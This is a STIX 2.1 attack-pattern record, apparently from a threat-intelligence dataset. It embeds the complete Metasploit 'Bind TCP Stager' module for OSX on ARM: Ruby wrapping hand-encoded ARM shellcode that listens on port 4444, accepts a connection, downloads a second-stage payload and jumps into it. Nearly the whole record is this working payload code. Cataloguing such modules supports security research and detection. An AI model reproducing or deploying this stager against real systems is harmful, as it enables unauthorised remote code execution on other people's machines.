{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--36d55f80-95fb-4bba-a685-e947abae39a5",
    "created": "2024-08-14T16:33:19.474752Z",
    "modified": "2024-08-14T16:33:19.474756Z",
    "name": "Bind TCP Stager",
    "description": "Listen for a connection",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stagers/osx/armle/bind_tcp.rb",
            "external_id": "bind_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n###\n#\n# BindTcp\n# -------\n#\n# OSX bind TCP stager.\n#\n###\nmodule MetasploitModule\n\n  CachedSize = 248\n\n  include Msf::Payload::Stager\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Bind TCP Stager',\n      'Description'   => 'Listen for a connection',\n      'Author'        => 'hdm',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'osx',\n      'Arch'          => ARCH_ARMLE,\n      'Handler'       => Msf::Handler::BindTcp,\n      'Stager'        =>\n        {\n          'Offsets' =>\n            {\n              'LPORT' => [ 66, 'n'    ],\n            },\n          'Payload' =>\n          [\n            # mmap\n            0xe3a0c0c5, # mov r12, #0xc5\n            0xe0200000, # eor r0, r0, r0\n            0xe3a01502, # mov r1, #0x2, 10\n            0xe3a02007, # mov r2, #0x7\n            0xe3a03a01, # mov r3, #0x1, 20\n            0xe3e04000, # mvn r4, #0x0\n            0xe0255005, # eor r5, r5, r5\n            0xef000080, # swi 128\n\n            # store mmap address\n            0xe1a0b000, # mov r11, r0\n\n            # socket\n            0xe3a00002, # mov r0, #0x2\n            0xe3a01001, # mov r1, #0x1\n            0xe3a02006, # mov r2, #0x6\n            0xe3a0c061, # mov r12, #0x61\n            0xef000080, # swi 128\n\n            # store socket\n            0xe1a0a000, # mov r10, r0\n            0xeb000001, # bl _bind\n\n            # port 4444\n            0x5c110200,\n            # host 0.0.0.0\n            0x00000000,\n\n            # bind\n            0xe1a0000a, # mov r0, r10\n            0xe1a0100e, # mov r1, lr\n            0xe3a02010, # mov r2, #0x10\n            0xe3a0c068, # mov r12, #0x68\n            0xef000080, # swi 128\n\n            # listen\n            0xe1a0000a, # mov r0, r10\n            0xe3a01001, # mov r1, #0x1\n            0xe3a0c06a, # mov r12, #0x6a\n            0xef000080, # swi 128\n\n            # accept\n            0xe3a0c01e, # mov r12, #0x1e\n            0xe1a0000a, # mov r0, r10\n            0xe3a01010, # mov r1, #0x10\n            0xe50d1018, # str r1, [sp, #-24]\n            0xe24d2010, # sub r2, sp, #0x10\n            0xe24d3018, # sub r3, sp, #0x18\n            0xef000080, # swi 128\n\n            # check socket\n            0xe1a07000, # mov r7, r0\n            0xe3500000, # cmp r0, #0x0\n            0xda000016, # ble _exit\n\n            # close server\n            0xe1a0000a, # mov r0, r10\n            0xe3a0c006, # mov r12, #0x6\n            0xef000080, # swi 128\n\n            # restore socket\n            0xe1a0a007, # mov r10, r7\n\n            # read length\n            0xe3a0c003, # mov r12, #0x3\n            0xe1a0000a, # mov r0, r10\n            0xe1a0100b, # mov r1, r11\n            0xe3a02004, # mov r2, #0x4\n            0xef000080, # swi 128\n\n            # setup download\n            0xe49b9000, # ldr r9, [r11], #0\n            0xe1a0800b, # mov r8, r11\n\n            # download stage\n            0xe3a0c003, # mov r12, #0x3\n            0xe1a0000a, # mov r0, r10\n            0xe1a01008, # mov r1, r8\n            0xe1a02009, # mov r2, r9\n            0xef000080, # swi 128\n            0xe3500000, # cmp r0, #0x0\n            0xba000004, # blt _exit\n            0xe0888000, # add r8, r8, r0\n            0xe0499000, # sub r9, r9, r0\n            0xe3590000, # cmp r9, #0x0\n            0x1afffff4, # bne _readmore\n\n            # jump to stage\n            0xe28bf000, # add pc, r11, #0x0\n\n            # exit process\n            0xe3a0c001, # mov r12, #0x1\n            0xef000080  # swi 128\n          ].pack(\"V*\")\n\n        }\n      ))\n  end\n\n  def handle_intermediate_stage(conn, payload)\n\n    print_status(\"Transmitting stage length value...(#{payload.length} bytes)\")\n\n    address_format = 'V'\n\n    # Transmit our intermediate stager\n    conn.put( [ payload.length ].pack(address_format) )\n\n    Rex::ThreadSafe.sleep(0.5)\n\n    return true\n  end\nend\n",
    "x_mitre_platforms": [
        "osx'"
    ]
}